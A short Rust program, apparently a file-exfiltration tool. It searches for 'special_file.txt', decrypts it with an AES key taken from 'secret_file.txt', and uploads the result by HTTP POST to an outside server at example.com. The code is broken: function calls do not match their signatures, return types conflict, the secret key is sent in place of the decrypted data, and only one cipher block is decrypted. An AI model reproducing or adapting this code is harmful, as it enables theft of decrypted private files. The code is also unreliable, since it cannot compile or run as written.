use std::fs::File;
use std::io::{self, Read};
use walkdir::WalkDir;
use aes::Aes256;
use aes::block_cipher_trait::generic_array::GenericArray;
use aes::block_cipher_trait::BlockCipher;
use reqwest::blocking::Client;
use reqwest::StatusCode;
use serde_json::json;

fn scan_system (file_path: &str) -> Result<String, io::Error> {
    let mut file = File::open(file_path)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    Ok(contents)
}

fn parse_secret() -> Result<Vec<u8>, io::Error> {
    let mut file = File::open("secret_file.txt")?;
    let mut secret_key = Vec::new();
    file.read_to_end(&mut secret_key)?;
    Ok(secret_key)
}

fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
    let key = GenericArray::from_slice(key);
    let cipher = Aes256::new(&key);
    let mut decrypted_data = encrypted_data.to_vec();
    cipher.decrypt_block(GenericArray::from_mut_slice(&mut decrypted_data));
    decrypted_data
}


fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
    let client = Client::new();
    let json_body = json!({
        "message": parsed_secret,
        "github_link": github_link
    });

    let response = client
        .post(server_url)
        .json(&json_body)
        .send()?;
    
    if response.status() == StatusCode::OK {
        println!("File sent successfully to server");
    } else {
        println!("Failed to send file to server: {:?}", response.status());
    }

    Ok(())
}

fn main() {
    let file_paths = scan_system().expect("Failed to scan system");
    let secret_key = parse_secret().expect("Failed to parse secret key");

    for file_path in file_paths {
        if file_path.ends_with("special_file.txt") {
            let mut file = File::open(&file_path).expect("Failed to open special_file.txt");
            let mut encrypted_data = Vec::new();
            file.read_to_end(&mut encrypted_data).expect("Failed to read special_file.txt");

            let decrypted_data = decrypt_file(&encrypted_data, &secret_key);
            send_contents(decrypted_data, "http://example.com/upload").expect("Failed to send contents");
        }
    }
}